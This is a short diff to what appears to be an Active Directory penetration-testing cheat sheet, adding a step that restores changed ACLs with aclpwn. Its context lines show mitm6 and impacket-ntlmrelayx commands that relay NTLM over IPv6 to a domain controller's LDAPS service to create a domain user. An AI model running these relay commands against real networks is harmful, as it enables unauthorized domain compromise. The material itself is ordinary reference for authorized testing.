@@ -35,6 +35,14 @@ sudo mitm6 -d DOMAIN
 
 $ sudo impacket-ntlmrelayx -6 -t [ldaps://DC_IP] -wh [fake-wpad.DOMAIN] -l [LOOT_DIR]
 # successful will create a user on domain
+# generates a .restore file to restore ACL.
+```
+
+### Restore using aclpwn
+
+```bash
+# pip3 install aclpwn
+aclpwn -d DOMAIN --restore .RESTORE_FILE [-u USER] [-p PASS] [-dry]
 ```
 
 ## DNS takeover using delegate access
